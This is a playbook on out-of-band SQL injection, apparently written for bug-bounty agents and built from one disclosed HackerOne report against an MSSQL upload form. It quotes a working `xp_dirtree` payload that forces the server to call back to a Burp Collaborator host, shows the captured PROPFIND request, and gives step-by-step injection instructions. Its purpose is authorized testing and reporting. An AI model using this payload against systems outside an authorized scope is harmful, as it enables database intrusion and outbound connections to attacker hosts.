---
title: "Out-of-Band SQL Injection — the callback channel"
type: playbook
category: out-of-band-callback
cwe: "CWE-89"
source_count: 1
full_bodies_available: 1
corpus: "HackerOne disclosed reports, 2014–2022 era, list seeded from github.com/shreyaschavhan/h1-reports-for-reference TOPSQLI.md, bodies fetched via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-25"
note: "Small corpus coverage — one confirmed full-body case in 247 listed rows. Claims trace to that body plus the time/boolean/error playbooks' carriers. Severity/weakness labels are archive-era historical; the body is the class authority."
---

# Out-of-Band SQL Injection — the callback channel

## 1. Overview

Exactly one confirmed OOB case in this corpus (SQL-272506, DoD, 2019, MSSQL) —
and it is *textbook-complete*, which is why it gets its own playbook despite the
thin sample: the injection goes out through a **file-transfer upload form**
(`from` parameter on `POST /FileTransfer/Upload`), and the database reaches
*back to the attacker over the network* — first a DNS lookup, then a full
WebDAV `PROPFIND` HTTP request.

Sample-size caveat stated plainly up front: the vault treats this file as the
place where the corpus's OOB doctrine lives; mechanics here are validated by one
body and motivated, in the other four playbooks, as the channel to use *when no
in-band oracle exists*.

**Case-ID scheme: `SQL-<report id>`** (e.g. `SQL-272506`).

## 2. The anchor case, in full — SQL-272506

The carrier is a multipart form field the body summarizes:

> The parameter **from** is injectable and leads to valid sql injection.

and the summary dose of honesty about scope:

> I didn't go all out and get a shell but, an attaker could exctract db information or execute sql command on the serve with the rights of the db user. (sic — "attaker", "exctract", "serve" kept)

### 2.1 The payload

```
';declare @q varchar(99);set @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- 
```

Anatomy, as the payload itself shows:

1. `';` — close the enclosing string and terminate the statement (the body notes
   *"Also it is easy to see that the single quote breaks the sql syntax."*).
2. `declare @q varchar(99);set @q='\\<collaborator-host>/random'` — build a UNC
   path pointing at attacker infrastructure.
3. `exec master.dbo.xp_dirtree @q;--` — make MSSQL itself enumerate that UNC
   "share", which forces the server to resolve DNS and attempt the SMB/WebDAV
   connection.

### 2.2 What came back — two callbacks of different kinds

> first I get a dns query on my burp collaborator (see sqli2.png)

— the fast, cheap first proof. Then the full HTTP-level callback, quoted
verbatim from the body, showing MSSQL's WebDAV mini-redirector polling the
collaborator host:

> second I get the server to poll with master.dbo.xp_dirtree from 143.85.74.18 at 2017-Sep-27 21:29:55

```
PROPFIND /random HTTP/1.1
Host: 4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net
Content-Length: 0
Depth: 0
translate: f
User-Agent: Microsoft-WebDAV-MiniRedir/6.0.6002
Accept-Encoding: gzip, deflate, identity
Connection: Keep-Alive
X-BlueCoat-Via: ██████████
```

Every line matters to an agent:

- `User-Agent: Microsoft-WebDAV-MiniRedir/6.0.6002` — the *database server's own
  OS stack* made the request; this is what distinguishes an OOB SQLi callback
  from any other outbound traffic the target has.
- `from 143.85.74.18 at 2017-Sep-27 21:29:55` — the body records *the egress IP
  and the timestamp*; the callback log is itself evidence-grade because it
  attributes the connection to the server, not to a browser.
- `X-BlueCoat-Via` — the egress passed a proxy chain; OOB callbacks survive
  egress proxies because SMB/WebDAV DNS resolution happens before filtering.

### 2.3 The remediation, verbatim

> Make prepared statement so the **'** doesnt get interpreted. (Input data validation)
> Maybe verify other parameters.

## 3. Why a one-channel playbook matters to an agent

1. **No oracles needed.** In every other playbook the attacker must *read* a
   band, a clock, or an error. Here the proof is an infrastructure event on a
   resource the agent already owns — no output channel exists on the target at
   all. When `Time-Based-Blind.md` §8 and `Boolean-and-Content-Oracle.md` §8
   both end their descents with *"then OOB"*, this file is where that descent
   lands: MSSQL targets with `xp_dirtree`/`xp_fileexist` reachable from a
   second statement are the classic shape.
2. **Attribution quality is the highest of any technique in the corpus.** The
   DNS query plus a protocol-shaped HTTP request with a database-server
   user-agent, an egress IP, and a timestamp is *server-side proof* — it cannot
   be confused with client-side noise or bot crawlers.
3. **Rigor mirror of SSRF.** Mechanically this is the SSRF vault's subject
   (`../SSRF/`) executed from inside the SQL interpreter: a server makes a
   network request to an attacker-chosen host. The difference is the trigger
   — SQL, not URL fetch — and the vault boundary is drawn exactly at that
   difference; OOB cases where the *vector* is HTTP, not SQL, belong to the
   SSRF vault.

## 4. Agent execution template

1. **Gating check first.** OOB is a MSSQL-flavored channel in this corpus.
   Before reaching for it, fingerprint the DBMS (`Time-Based-Blind.md` §3's
   call book; `Error-and-Union-Output.md` §2's announce-errors). Non-MSSQL
   engines need different callback primitives and none are demonstrated in this
   corpus — record that honestly rather than pattern-matching `xp_dirtree` onto
   MySQL/PostgreSQL targets.
2. **Stage the listener before injecting.** Collaborator-style endpoint up, log
   rotated, DNS + HTTP both observable. The corpus's body needed *two* callback
   kinds to make the case; budget for both.
3. **Keep the single-quote pair** as the sanity check first (`'` → syntax error,
   `''` → different behavior — same pair doctrine as
   `Error-and-Union-Output.md` §2's RFC quotes and 761304's cookie pair), then
   switch to the stacked `declare … set … exec` form.
4. **Inject the full statement once.** Note the body's construction —
   `';declare @q varchar(99);set @q='\\<host>/random'; exec master.dbo.xp_dirtree @q;--`
   — the `/random` path component makes each callback *distinctly attributable*
   to one payload instance.
5. **Log the callback forensically** in the report exactly as the corpus body
   does: time, source IP, `User-Agent`, full request line for HTTP-level
   callbacks. Partial logs (DNS only) are still proof — label them as such.
6. **Stay on the read side.** The corpus's remedy sentence and its own scope
   statement (*"I didn't go all out and get a shell"*) both bound the technique
   at proof-of-callback; no production data flows through the channel.

## 5. Validation gates

1. **Callback attributed** — DNS lookup at minimum; the HTTP-level `PROPFIND`
   with `Microsoft-WebDAV-MiniRedir` user-agent is the stronger form. An
   unattributed DNS hit (shared resolver, CDN prefetch) does not qualify.
2. **The two probes differ by one variable** — same host, payload vs. no-payload
   request otherwise identical; report both raw requests (the corpus body
   reproduces the whole multipart request, headers and all, so the callback
   cannot belong to anything else).
3. **Database-verb truth** — the claim names the executing primitive (`master.dbo.xp_dirtree`)
   and the DBMS; no generic "we made the server talk" sentences.
4. **Distinguish OOB-SSRF from OOB-SQLi** — state *which SQL expression* forced
   the callback (here: `xp_dirtree` on a `set`-variable). If the trigger was an
   HTTP fetch, the finding belongs to `../SSRF/`.
5. **No exfiltration beyond the callback itself** unless scope authorizes it —
   in-band exfil via OOB channels (e.g., DNS-carrying payloads) was *never*
   demonstrated in this corpus's 100 confirmed bodies; don't dress the corpus up
   with it.

## 6. Corruption/log-poisoning adjacency

One structural cousin appears elsewhere in the corpus: SQL-31023 (Khan Academy's
`smarthistory cab` file, 2014) shows a 404-logger `INSERT` built from the
requested URL — attacker text flowing into an *INSERT*, not a SELECT (recorded
in `Library-and-Framework-SQLi.md` §4 as query-construction). Read its body with
this file's lens: same question — *which server-side process reaches the
attacker?* — different prong (write-shaped query vs. callback).

## 7. Archive-era label honesty

- SQL-272506's archetype predates most "OOB SQLi" vocabulary of the era's
  public literature; its body calls it plainly *"SQL injections"* with
  weakness `SQL Injection`, severity `high`, resolved, $0 bounty
  (list-stated). No CVE, no vendor name in the body.
- The DoD program context explains the discipline of the report: full request
  reproduced, no shell attempt, prepared-statement remedy suggested — copy
  that cadence: minimal extraction, maximal reproducibility.

**Cross-references**: in-band extraction in `Error-and-Union-Output.md`; blind
channels in `Time-Based-Blind.md` and `Boolean-and-Content-Oracle.md`; the
network-request vault for HTTP-triggered OOB in `../SSRF/`; the escalation
end-game in `SQLi-to-RCE-Chains.md`.
